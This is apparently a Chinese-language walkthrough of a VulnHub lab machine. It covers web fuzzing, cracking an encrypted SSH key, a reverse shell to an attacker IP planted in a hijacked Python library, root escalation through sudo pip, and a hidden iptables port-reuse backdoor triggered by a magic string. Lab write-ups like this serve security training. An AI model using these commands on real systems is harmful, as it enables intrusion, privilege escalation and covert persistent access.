&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-335.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 得到一个提示 /～myfiles&lt;/p&gt;
&lt;h3 id=&#34;wfuzz-模糊测试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#wfuzz-模糊测试&#34;&gt;#&lt;/a&gt; wfuzz 模糊测试&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;可能隐藏的含义是，一个缺少参数的后门文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wfuzz -c -u http://192.168.31.236/~myfiles/?FUZZ=xxx -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;扫描是否存在 http://192.168.31.236/~myfiles/?FUZZ=xx&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-336.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;返回结果全是 200 即表示不存在拼接参数&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;也可能是一个目录结构，首字符为～的形式&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wfuzz -c -u http://192.168.31.236/~FUZZ -w /usr/share/wordlists/dirbuster/directory-&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;list-2.3-medium.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;扫描是否存在 http://192.168.31.236/～FUZZ&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-337.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;返回结果都是 404&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;过滤掉 404 继续扫描&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;wfuzz -c -u http://192.168.31.236/~FUZZ -w /usr/share/wordlists/dirbuster/directory-&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;list-2.3-medium.txt | grep -v 404&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-338.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;扫到了一个特殊的目录 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjM2L35zZWNyZXQ=&#34;&gt;http://192.168.31.236/~secret&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-339.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 提示有一个 ssh 私钥文件隐藏在这个目录下，并且需要 fasttrack 这个字典，有一个用户叫做 icex64&lt;/p&gt;
&lt;h3 id=&#34;burp-加载字典爆破&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#burp-加载字典爆破&#34;&gt;#&lt;/a&gt; burp 加载字典爆破&lt;/h3&gt;
&lt;p&gt;burp 做代理，拦截浏览器请求，识别是否存在隐藏文件.a.txt 的文件将 a 与 txt 作为变量，进行多次重发数据&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-340.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;选择字典，第一个字典我选用的是 kali 中的 /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-341.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;第二个字典是几种比较可能的私钥文件后缀:.txt,.pub,.html,.cer,.pem,.der,.key&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-342.png&#34; width=&#34;430&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;数据装载完毕，开始爆破&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-343.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;-&amp;gt; 唯一返回的 200 状态码的是 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjM2L35zZWNyZXQvLm15c2VjcmV0LnR4dA==&#34;&gt;http://192.168.31.236/~secret/.mysecret.txt&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;ffuf-模糊测试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#ffuf-模糊测试&#34;&gt;#&lt;/a&gt; ffuf 模糊测试&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;或者用ffuf的方法进行爆破目录&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;ffuf -u &amp;quot;http://192.168.31.236/~secret/.FUZZ&amp;quot; -w /usr/share/seclists/Discovery/Web-&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Content/directory-list-2.3-medium.txt - e .txt,.pub,.html,.cer,.pem,.der,.key&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-344.png&#34; width=&#34;600&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 获得关键网址：&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjM2L35zZWNyZXQvLm15c2VjcmV0LnR4dA==&#34;&gt;http://192.168.31.236/~secret/.mysecret.txt&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;cyberchef-解密&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#cyberchef-解密&#34;&gt;#&lt;/a&gt; CyberChef 解密&lt;/h3&gt;
&lt;p&gt;访问该网址，得到了一串密码&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-345.png&#34; width=&#34;600&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;用 CyberChef 通过 magic 方法在线解密，得到是 base58 解密，复制解密代码&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-346.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;观察得到的密文，发现仍然是加密的！并不是真正的 ssh 私钥！&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-347.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;john-破解私钥&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#john-破解私钥&#34;&gt;#&lt;/a&gt; john 破解私钥&lt;/h3&gt;
&lt;p&gt;采用 ssh2join.py 来破解 ssh 私钥，john 是一个破解系统密码的工具。&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;寻找 ssh2join.py 位置&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;使用locate sshjoin.py没有发现ssh2join.py文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;改用find / -name “ssh2john.py”&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;使用工具 ssh2john 转换为可以识别的信息&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python /usr/share/john/ssh2john.py ~/Desktop/tool/lupin/vulnhub_lupin &amp;gt; crack.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-348.png&#34; width=&#34;600&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;接下来要使用到上文所提示到的fastrack.txt文件&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;find / -name “fasttrack.txt”&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;john crack.txt --wordlist=/usr/share/wordlists/fasttrack.txt&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-349.png&#34; width=&#34;600&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 得到私钥文件的密码 P@55w0rd!&lt;/p&gt;
&lt;p&gt;指定私钥文件登陆对方服务器，选择密钥的密码为破解的密码&lt;/p&gt;
&lt;p&gt;&lt;code&gt;ssh icex64@192.168.31.236 -i vulnhub_lupin&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-350.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;成功登陆到了服务器，并且有一个隐私设置问题&lt;/p&gt;
&lt;p&gt;-&amp;gt; 可以无密码调用 arsene 用户去执行这个文件&lt;/p&gt;
&lt;h3 id=&#34;py-依赖库修改&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#py-依赖库修改&#34;&gt;#&lt;/a&gt; py 依赖库修改&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;直接将反弹shell的代码打印到此文件中&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo “bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.135/4444 0&amp;gt;&amp;amp;1” &amp;gt;&amp;gt; /home/arsene/heist.py&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-351.png&#34; width=&#34;600&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;没有权限去加载此 payload，翻阅目录，查找更多的敏感信息，发现这个文件里边有引入包 webbrower 这个操作，还有一份提示文件，这个提示文件就是说要运行此 python 文件&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;locate webbrowser寻找此文件 没有找到&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;find / -name “webbrowser”&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-352.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;将反弹shell的代码加载到此文件中&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;vim /usr/lib/python3.9/webbrowser.py&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;os.system(&amp;#x27;/usr/bin/bash /tmp/shell.sh&amp;#x27;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;shell.sh内容如下&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;cat &amp;gt; /tmp/shell.sh &amp;lt;&amp;lt; EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;!/bin/bash&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.135/4444 0&amp;gt;&amp;amp;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;EOF&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chmod +x /tmp/shell.sh&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;调用 arsene 去执行该文件&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-353.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 监听 4444 ，并且拿到了 arsene 用户的 shell&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-354.png&#34; width=&#34;490&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;sudopip提权&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sudopip提权&#34;&gt;#&lt;/a&gt; sudo (pip) 提权&lt;/h3&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;查看权限设置问题&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo -l&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;pip提权&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;TF=$(mktemp -d)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo &amp;quot;import os; os.execl(&amp;#x27;/bin/sh&amp;#x27;, &amp;#x27;sh&amp;#x27;, &amp;#x27;-c&amp;#x27;, &amp;#x27;sh &amp;lt;$(tty) &amp;gt;$(tty) 2&amp;gt;$(tty)&amp;#x27;)&amp;quot; &amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;TF/setup.py&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sudo pip install $TF&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-355.png&#34; width=&#34;530&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 成功拿到 root 权限&lt;/p&gt;
&lt;h3 id=&#34;iptables-端口复用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#iptables-端口复用&#34;&gt;#&lt;/a&gt; iptables 端口复用&lt;/h3&gt;
&lt;p&gt;这里不做权限维持，直接上的权限隐藏，注意攻击机是 192.168.31.237 靶机是 192.168.31.236&lt;/p&gt;
&lt;p&gt;在目标服务器上依次执行以下命令&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;创建端口复用链子：&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;iptables -t nat -N MyChains&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;#&lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;创建端口复用规则，访问192.168.3.6:80的流量转发至 22 端口：(如果要转发到其他ip机器，注意需要开启转发功能)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;iptables -t nat -A MyChains -p tcp -j REDIRECT --to-port 22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;设置开启开关，当接收到一个含有&lt;span class=&#34;string&#34;&gt;&amp;quot;nihao123coming&amp;quot;&lt;/span&gt;的TCP包，则将来源IP添加到MyChains的列表中&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;iptables -A INPUT -p tcp -m string --string &amp;quot;nihao123coming&amp;quot; --algo bm -m recent --&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set --name MyChains --rsource -j ACCEPT&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;设置关闭开关，如果接收到含有&lt;span class=&#34;string&#34;&gt;&amp;quot;nihao123leaving&amp;quot;&lt;/span&gt;的TCP包，则将来源IP从MyChains的列表中删除&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;iptables -A INPUT -p tcp -m string --string &amp;quot;nihao123leaving&amp;quot; --algo bm -m recent --&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;name MyChains --remove -j ACCEPT&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;当发现SYN包的来源IP处于MyChains的列表中，将跳转到MyChains链进行处理，有效时间为 3600 秒&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3600 --name MyChains --rsource -j MyChains&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-356.png&#34; alt&gt;&lt;/p&gt;
&lt;p&gt;攻击机上执行以下命令&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;开启复用，开启后发送开启命令的机器到目标 80 端口的流量将被转发到目标 20 端口&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nc 192.168.3.6 80&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nihao123coming&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-357.png&#34; width=&#34;490&#34; alt=&#34;Image&#34;&gt;
